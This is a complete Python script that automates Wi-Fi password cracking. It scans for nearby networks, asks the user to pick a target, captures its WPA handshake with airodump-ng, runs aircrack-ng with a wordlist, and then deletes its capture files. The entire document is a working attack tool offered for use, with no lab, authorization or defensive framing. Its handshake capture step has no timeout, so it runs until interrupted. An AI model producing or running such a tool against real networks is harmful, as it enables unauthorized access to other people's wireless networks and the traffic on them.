import os
import subprocess
import time
from scapy.all import *

# Function to enable monitor mode
def enable_monitor_mode(interface):
    result = os.system(f"sudo airmon-ng start {interface}")
    if result != 0:
        print(f"Failed to enable monitor mode on {interface}")
        return False
    return True

# Function to disable monitor mode
def disable_monitor_mode(interface):
    os.system(f"sudo airmon-ng stop {interface}")

# Function to scan for networks
def scan_networks(interface, scan_duration=30):
    print("[*] Scanning for networks...")
    proc = subprocess.Popen(f"sudo airodump-ng {interface} --output-format csv -w scan_results", shell=True)
    time.sleep(scan_duration)
    proc.terminate()
    print("[*] Scan complete. Available networks:")
    
    try:
        with open('scan_results-01.csv', 'r') as f:
            networks = []
            for line in f:
                if line.startswith('BSSID'):
                    continue
                parts = line.split(',')
                if len(parts) > 13:
                    networks.append((parts[0].strip(), parts[13].strip(), parts[3].strip()))
        
        for i, net in enumerate(networks):
            print(f"{i}. BSSID: {net[0]}, ESSID: {net[1]}, Channel: {net[2]}")
        
        return networks
    except FileNotFoundError:
        print("No networks found or scan_results-01.csv not found.")
        return []

# Function to capture handshake
def capture_handshake(interface, bssid, channel):
    print(f"[*] Capturing handshake for BSSID {bssid} on channel {channel}...")
    os.system(f"sudo airodump-ng -c {channel} --bssid {bssid} -w handshake {interface}")
    print("[*] Handshake capture complete.")

# Function to crack password
def crack_password(bssid, wordlist_path):
    print(f"[*] Cracking password for BSSID {bssid} using wordlist {wordlist_path}...")
    try:
        result = subprocess.run(['aircrack-ng', '-w', wordlist_path, '-b', bssid, 'handshake-01.cap'], capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"Error running aircrack-ng: {e}")

# Main function
def main():
    interface = "wlan1"
    if not enable_monitor_mode(interface):
        return

    try:
        networks = scan_networks(interface)
        if not networks:
            print("No networks found. Exiting...")
            return
        
        network_index = int(input("Enter the number of the network to target: "))
        bssid, essid, channel = networks[network_index]
        
        capture_handshake(interface, bssid, channel)
        
        wordlist_path = input("Enter the path to the wordlist to use for cracking: ")
        crack_password(bssid, wordlist_path)
        
    finally:
        disable_monitor_mode(interface)
        os.system("rm scan_results* handshake*")

if __name__ == "__main__":
    main()
